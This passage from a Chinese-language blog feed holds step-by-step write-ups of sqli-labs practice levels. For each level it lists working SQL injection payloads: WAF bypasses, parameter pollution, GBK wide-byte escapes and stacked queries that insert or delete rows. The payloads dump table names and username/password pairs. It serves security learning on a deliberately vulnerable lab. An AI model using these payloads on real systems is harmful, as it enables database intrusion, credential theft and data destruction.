<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,database(),3%0aand(&#x27;1</span><br><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,version(),3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&#x27;users&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第28a关"><a href="#第28a关" class="headerlink" title="第28a关"></a>第28a关</h2><p>与28关相比，只是过滤条件少了几个</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>构造语句的原理还不甚明白，有些人写的博客能过，有些不能过。<br>总的来说，用%00是比较通用简单的方式</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105801767">Sqli-labs之Less-28和Less-28a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_29-31</title>
    <url>/2022/11/17/sqli-labs_29-31/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又出了个新花样</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>先进行常规操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+  出现报错</span><br><span class="line">?id=-1&#x27;union select 1,2,3 --+  爆出显示位</span><br></pre></td></tr></table></figure>
<p>但当我们进入login.php页面，再继续注入时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login.php?id=1&#x27; --+</span><br></pre></td></tr></table></figure>
<p>页面跳转<br><img src="/simg/sqli-labs_29.png" alt="显示"><br>这里是部署了WAF<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。<br>详细解释：<a href="https://baike.baidu.com/item/WAF/3239498">WAF</a><br>第一个参数被WAF所检查，但第二个参数不会，因此我们可以加入第二个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=2</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=2&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),3 from users --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第30关"><a href="#第30关" class="headerlink" title="第30关"></a>第30关</h2><p>与第29关差不多，只是闭合方式从’变更为”</p>
<h2 id="第31关"><a href="#第31关" class="headerlink" title="第31关"></a>第31关</h2><p>与第29关差不多，只是闭合方式从”变更为”)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>主要是，知道怎么做，注入方式就那几样，常规注入，报错注入，布尔盲注，时间盲注，抓包注入…</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_32+33</title>
    <url>/2022/11/18/sqli-labs_32+33/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关涉及到了编码格式</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  发现被转义为了 1\&#x27;</span><br></pre></td></tr></table></figure>
查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
复习一下，<br>preg_replace()函数执行一个正则表达式的搜索和替换。详细：<a href="https://www.runoob.com/php/php-preg_replace.html">PHP preg_replace() 函数</a><br>preg_quote()函数用于转义正则表达式字符。详细：<a href="https://www.runoob.com/php/php-preg_quote.html">PHP preg_quote() 函数</a><br>因此，我们无法用单引号双引号闭合注入<br>但源码中还有一句引起了注意：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_query(&quot;SET NAMES gbk&quot;);</span><br></pre></td></tr></table></figure>
这里表明是使用gbk编码，那么我们可以尝试使用宽字节注入。</li>
</ol>
<ul>
<li>当某字符的大小为一个字节时，称其字符为窄字节.</li>
<li>当某字符的大小为两个字节时，称其字符为宽字节.</li>
<li>所有英文默认占一个字节，汉字占两个字节</li>
<li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等<br>宽字节的格式是在地址后先加一个%df，再加单引号，因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字“連”，所以这时，单引号成功逃逸。<br>宽字节注入情况：</li>
<li>客户端、连接层、结果集 都是GBK编码</li>
<li>使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。</li>
<li>使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）先转为UTF-8，然后再拼接入SQL语句。</li>
</ul>
<p>注意：<br>页面默认是utf-8，如果想看显示效果需要更改页面编码，我这里是用到了chrome的扩展商店的插件，具体可看下面这篇文章<br><a href="https://www.munue.com/172.html#:~:text=%E5%8F%B3%E9%94%AE%E7%82%B9%E5%87%BB%E5%9B%BE%E6%A0%87%EF%BC%8C%E6%89%93%E5%BC%80%E9%80%89%E9%A1%B9,%E8%BF%9B%E8%A1%8C%E9%80%89%E6%8B%A9%E5%92%8C%E8%AE%BE%E7%BD%AE%E7%BC%96%E7%A0%81%E3%80%82">Google Chrome 浏览器如何设置网页编码</a></p>
<p>最终，我们构造该语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure>
<p>页面显示效果如下<br><img src="/simg/sqli-labs_32.png" alt="显示效果"></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(0x7e,id,0x7e,username,0x7e,password) from users) --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第33关"><a href="#第33关" class="headerlink" title="第33关"></a>第33关</h2><p>和第32关本质是一样的，只是源码用了addslashes()函数<br>addslashes()函数：addslashes() 函数返回在预定义的字符前添加反斜杠的字符串<br>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL<br>注入方式相同，这里不再重复</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学到了宽字节注入</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_34</title>
    <url>/2022/11/18/sqli-labs_34/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>gogogo</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>有两种方案：</p>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol>
<li><p>测试并判断注入类型<br>和之前的32，33关差别不大，但是这回是POST提交方式<br>因为在url栏中输入 %df 主要是以 16进制形式输入，而在输入框输入 %df 则是以普通字符串输入的。<br>所以我们需要略作改变<br>绕过方法：有些汉字的编码为三个字节的编码，我们将三个字节拆开来看，前两个为一组，后面的那个和 \ 相编码为两字节绕过，从而使得单引号逃逸</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><ol>
<li><p>测试并判断注入类型<br>既然在输入栏不能直接输入，我们可以通过burp抓包来注入。</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="burp注入的另一种方案，在Hex栏修改16进制注入为df。"><a href="#burp注入的另一种方案，在Hex栏修改16进制注入为df。" class="headerlink" title="burp注入的另一种方案，在Hex栏修改16进制注入为df。"></a>burp注入的另一种方案，在Hex栏修改16进制注入为df。</h3><p>可参见：<a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br>虽然不算很实用的方法，但也不失为一种有趣的思路。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>稍微改了个形式罢了，不足挂齿</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-lab教程——1-35通关Writeup</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_35</title>
    <url>/2022/11/18/sqli-labs_35/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目的提示已经很明显了</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
<p>通过这段源码，我们可以知道，id没有被单引号括起来所以addslashes起不到作用<br>直接payload即可</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看破陷阱后，其实很简单</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_3</title>
    <url>/2022/11/08/sqli-labs_3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
<ol start="3">
<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>此笔记为笔者初学sql注入时所写</li>
<li>本关重点在于通过报错信息判断sql语句</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_38-41</title>
    <url>/2022/11/18/sqli-labs_38-41/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又可以学到新的注入方式–堆叠注入。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>首先查看源码，发现这样一条语句<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>
mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用分号分隔的SQL语句。<br>详细可见：<a href="https://www.php.net/manual/zh/mysqli.multi-query.php#:~:text=mysqli_multi_query%20%28mysqli%20%24link%2C%20string%20%24query%29%3A%20bool%20%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%20SQL,%E8%AF%AD%E5%8F%A5%E3%80%82%20%E8%A6%81%E8%8E%B7%E5%BE%97%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%20mysqli_use_result%20%28%29%20%E6%88%96%20mysqli_store_result%20%28%29%20%E5%87%BD%E6%95%B0%E3%80%82">mysqli_multi_query</a></li>
</ol>
<p>那么，当我们看到这条语句时，就可以注意能否使用<strong>堆叠注入</strong>了。<br>所谓堆叠注入，简单地说，是能够同时注入多条语句。<br>实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>增删改<br>这里示例一个增，也即为插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; ;insert into users(id,username,password)values(100,&#x27;772211&#x27;,&#x27;112277&#x27;);</span><br><span class="line">?id=100</span><br></pre></td></tr></table></figure>
<p>先后输入这两条语句，可以看到插入成功<br>示例一个删</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) ;delete from users where id=1;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第39关"><a href="#第39关" class="headerlink" title="第39关"></a>第39关</h2><p>与第38关相比差不多，只不过第39关不需要单引号</p>
<h2 id="第40关"><a href="#第40关" class="headerlink" title="第40关"></a>第40关</h2><p>与第38关相比差不多，只不过第40关的闭合方式是’)</p>
<h2 id="第41关"><a href="#第41关" class="headerlink" title="第41关"></a>第41关</h2><p>与38关差不多，也可堆叠注入</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>冲冲冲</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/qq_45691294/article/details/107376284">SQL注入之堆叠注入</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_4</title>
    <url>/2022/11/08/sqli-labs_4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
<ol start="3">
<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
